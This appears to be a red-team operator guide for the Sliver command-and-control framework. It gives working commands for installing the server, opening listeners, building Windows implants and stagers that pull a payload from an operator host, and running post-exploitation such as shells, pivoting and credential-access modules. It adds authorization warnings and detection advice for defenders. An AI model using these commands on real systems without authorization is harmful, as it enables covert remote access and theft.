> Continuation with more red team tools that are used

---
## Silver (by bishop fox)

# SLIVER — OPEN-SOURCE C2 FRAMEWORK: SETUP & OPERATOR GUIDE

> Scope: standing up your own Sliver infrastructure and operating it for an authorized red team engagement. This is a genuinely different category from everything else in this series — it establishes real, working remote access on real machines, not passive analysis.

---

## 0. GROUND RULES — READ THIS FIRST

1. Sliver's entire purpose is remote command execution on a target machine. Only ever run an implant against systems you own outright or have **explicit, signed, scoped authorization** to test. Unauthorized use is a serious crime in essentially every jurisdiction (CFAA in the US, the Computer Misuse Act in the UK, equivalents almost everywhere else) — the tool being free and open source changes nothing about the legality of where you point it.

2. Your Sliver server *is* sensitive infrastructure the moment a listener is live — it holds active backdoor access to whatever calls back to it. A compromised C2 server mid-engagement is a compromised client, full stop.

3. Getting initial access onto a target (phishing, an exploited vulnerability, physical access) is a separate phase of an engagement with its own authorization and its own tradecraft — this guide starts from "you already have execution," not before it.

---

## 1. WHAT IT ACTUALLY IS

Sliver is Bishop Fox's open-source, cross-platform adversary-emulation/red-team framework, written in Go — positioned explicitly as a free alternative to Cobalt Strike. Implants support callback over **mTLS, WireGuard, HTTP(S), and DNS**, and each compiled implant gets its own per-binary asymmetric encryption keypair.

**Core terminology, since it's used constantly below:**

| Term | Meaning |
|---|---|
| Implant | The compiled binary placed on the target |
| Session | An interactive, real-time connection — the implant holds the channel open |
| Beacon | An asynchronous, task-based connection — checks in on an interval, pulls queued tasks, posts results, sleeps again |
| Listener | The server-side service waiting for implant callbacks over a chosen protocol |

**Why client-server split matters:** the listener (server) and the operator's console (client) are separate processes. A dropped client connection or a stray Ctrl+C doesn't kill the server or drop any active callbacks, and multiple operators can connect to one server for a coordinated multi-person engagement.

---

## 2. INSTALLATION

```bash
# official one-liner — installs client + server, compiles from source
curl https://sliver.sh/install | sudo bash
```

**Worth knowing before you run that:** piping straight into `sudo bash` is exactly the kind of thing worth a quick look first — `curl https://sliver.sh/install` on its own to read the script before re-running with `| sudo bash` costs you nothing.

**Alternative — prebuilt binaries from GitHub releases**, if you'd rather not compile from source:

```bash
mkdir /opt/sliver && cd /opt/sliver
wget https://github.com/BishopFox/sliver/releases/download/<version>/sliver-server_linux
wget https://github.com/BishopFox/sliver/releases/download/<version>/sliver-client_linux
chmod +x sliver-server_linux sliver-client_linux
```

**Alternative — systemd service install** (from the official wiki's install script), which also sets up the Windows cross-compiler dependencies (mingw) needed for building Windows implants and configures multiplayer for your user:

```bash
curl https://gist.githubusercontent.com/moloch--/43fd12a704f47deaebbedab2f5be15ba/raw/8a3749e003a8b364c7454a9c059bacc0b2173b98/install-sliver.sh | /bin/bash
```

Once installed, run `sliver` to drop into the operator console.

---

## 3. LISTENERS — GETTING CALLBACKS TO LAND SOMEWHERE

```
sliver > mtls --lhost <ip> --lport 8888
sliver > http --lhost <ip> --lport 8088
sliver > https --lhost <ip> --lport 443 --domain <domain>
sliver > dns --lhost <ip> --domains <domain>
sliver > wg --lhost <ip> --lport 51820

sliver > jobs           # list every active listener
sliver > kill <job-id>  # stop one
```

**Operational logic — which protocol, and why:** the Sliver devs explicitly recommend **mTLS or WireGuard** first — both require mutual certificate/key validation before a connection even completes, which is a meaningfully stronger default than a plaintext-adjacent channel. **HTTP(S)** blends into normal web traffic on networks that expect to see it (an implant configured with `--http` tries HTTPS first, falls back to HTTP only if that fails). **DNS** is the most likely to slip past a network that heavily inspects HTTP/TLS, but it's UDP-based, comparatively fragile, and generally not the first protocol to reach for if you're new to the tool.

---

## 4. GENERATING IMPLANTS

**Session vs. Beacon — the first real decision, and it isn't reversible after the fact** (a session-mode implant can't later be converted to beacon mode):

| | Session | Beacon |
|---|---|---|
| Connection style | Persistent, real-time | Interval check-in, then sleeps |
| Interactivity | Immediate — `shell`, `portfwd`, `socks5` work natively | Commands queue, execute on next check-in |
| Noise profile | Higher — constant heartbeat traffic | Lower, especially with jitter |
| Best for | Short interactive windows, hands-on-keyboard work | Long-running engagements, stealth-priority work |

```bash
# session implant, callback over mTLS
generate --mtls <ip>:8888 --os windows --arch amd64 -N <name>

# beacon implant, callback over HTTP, checks in every ~60s with jitter
generate beacon --http <ip>:8088 --seconds 60 --jitter 30 -N <name>
```

**Output formats** — pick based on how the implant needs to land on the target:

```
exe        -> standard standalone binary (default)
shellcode  -> raw position-independent code, run via a small C#/PowerShell/C loader
             stub instead of ever writing a recognizable executable to disk
dll        -> for DLL injection / sideloading scenarios
```

**Profiles + stagers** — for repeatable builds and smaller initial payloads:

```bash
profiles new --http <ip>:8088 --format shellcode <profile-name>
profiles generate --name <profile-name> -N <output-name>

# two-stage delivery: a tiny stager fetches the real implant over HTTP at runtime
stage-listener --url http://<ip>:8443 --profile <profile-name>
generate stager --http <ip>:8443 --arch amd64 --os windows -o stager.bin
```

**When to use a stager instead of a full implant:** whenever your delivery mechanism favors a small initial payload (a macro, a short script, limited buffer space) — the stager itself is tiny and just fetches the full implant from your stage-listener once it executes.

---

## 5. OPERATING ON A TARGET

Once an implant calls back to a live listener:

```
sliver > sessions        # list active sessions
sliver > beacons         # list active beacons
sliver > use <id>        # interact with a specific one
```

From an active session/beacon, the standard post-exploitation command set covers: `ls`/`cd`/`download`/`upload` (filesystem), `ps` (process listing), `shell` (drop to a native shell), `portfwd`/`socks5` (pivoting, session-mode only), `execute-assembly` (run a .NET assembly in-memory), and `screenshot`. Sliver also ships built-in support for **Windows process migration, process injection, and user token manipulation** — these exist to let an operator move an implant's execution context into a more appropriate or longer-lived process, or operate under a different user's token once privilege escalation has occurred during the engagement, rather than to be used as a walkthrough of injection internals here.

---

## 6. ARMORY — THE EXTENSION ECOSYSTEM

```
sliver > armory                  # list what's available
sliver > armory search <regex>   # search by name
sliver > armory install <name>   # install one
sliver > armory install all      # install everything
```

Armory is a community-maintained catalog of extra modules — recon helpers, credential-access tooling (Kerberoasting, Certify-style certificate abuse checks), privilege-escalation aids — that plug straight into an active session. **Treat it like any third-party dependency in a real engagement: review what a module actually does before running it against a client's environment**, since it's a community-contributed catalog, not code Bishop Fox has individually audited end to end.

---

## 7. OPSEC / TRADECRAFT — CONCEPTUAL LEVEL

1. **Beacons with jitter over sessions**, whenever the engagement timeline allows it — the irregular check-in interval is a materially smaller network signature than a constant open connection.
2. **Vary C2 protocols across an engagement** rather than committing everything to one — don't put all implants on mTLS alone if HTTP(S) or WireGuard would blend better with the specific environment.
3. **Symbol obfuscation is on by default** — worth explicitly verifying it's actually present in your production builds rather than assuming.
4. **Name implants meaningfully** with `-N` — on any engagement running more than a couple of footholds, an unnamed session list becomes unreadable fast.
5. **Clean up after yourself.** Removing implants and clearing logs once an authorized engagement concludes isn't optional tradecraft — leaving live backdoor access on a client's systems after the contract ends is a serious professional and ethical failure, independent of how the engagement went.

---

## 8. DETECTION — THE BLUE TEAM SIDE OF THIS SAME TOOL

Worth knowing even as an operator, since it's exactly what you're being tested against:

1. **Outbound connections on common C2 ports** (443, 80, 53) to destinations with no established business relationship to the host.
2. **TLS certificate anomalies** — Sliver generates its own certificates per deployment, which can present differently than a normal CA-issued cert to inspection tooling.
3. **Unusual process parent/child relationships** — the same signal your Volatility phase-1 process triage from the memory forensics guide is built to catch.
4. **EDR behavioral detection tuned for beaconing patterns** — this is precisely what **RITA's beacon score**, from the network forensics extension earlier in this series, is designed to surface: a jittered-but-still-statistically-regular check-in interval is the exact shape RITA scores highest, whether the tool behind it is Sliver, Cobalt Strike, or anything else built the same way.

---

## 9. WORKED EXAMPLE — A FULL AUTHORIZED ENGAGEMENT FLOW

1. Engagement scoped and authorized in writing; rules of engagement confirm target systems and testing windows.
2. Sliver server stood up, `mtls` listener started on the assessment infrastructure.
3. `generate beacon --mtls <ip>:8888 --os windows --arch amd64 --seconds 60 --jitter 30 -N eng01-beacon` — a stealth-priority implant built for a multi-day engagement.
4. Implant delivered via whatever initial-access vector the engagement's separate exploitation phase produced (out of scope for this guide).
5. Beacon checks in; `beacons` shows it live; `use <id>` to start interacting.
6. Post-exploitation via the standard command set, plus any relevant Armory modules reviewed and installed as needed for the specific objective (credential access, lateral movement, etc.).
7. Findings documented as they're made — same discipline as every forensics guide in this series: screenshot/log every action, note the exact command and timestamp that produced each piece of evidence.
8. At engagement close: implants removed from every touched host, logs cleared, and the client report written from the documentation gathered in step 7 — not reconstructed from memory afterward.

---
## havoc 
